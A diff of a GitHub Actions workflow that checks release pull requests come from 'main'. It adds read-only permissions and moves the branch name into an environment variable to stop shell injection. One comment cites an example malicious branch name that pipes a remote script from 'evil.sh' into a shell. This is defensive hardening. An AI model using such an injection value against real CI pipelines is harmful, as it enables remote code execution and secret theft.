@@ -7,16 +7,24 @@ name: Source Branch Check
 on:
   workflow_call:
 
+# Least-privilege default: this check only reads the PR's branch name.
+permissions:
+  contents: read
+
 jobs:
   source-branch:
     name: Check source branch
     runs-on: ubuntu-latest
     steps:
       - name: Verify PR is from main
+        env:
+          # Passed through an env var, not interpolated directly into the
+          # script: the branch name is attacker-controlled (anyone can open
+          # a PR with a crafted branch name like `$(curl evil.sh | sh)`),
+          # so it must never be substituted straight into a shell script.
+          SOURCE: ${{ github.event.pull_request.head.ref }}
         run: |
           set -euo pipefail
-
-          SOURCE="${{ github.event.pull_request.head.ref }}"
 
           if [ "$SOURCE" != "main" ]; then
             echo "::error::Release PRs must come from the 'main' branch, not '${SOURCE}'"
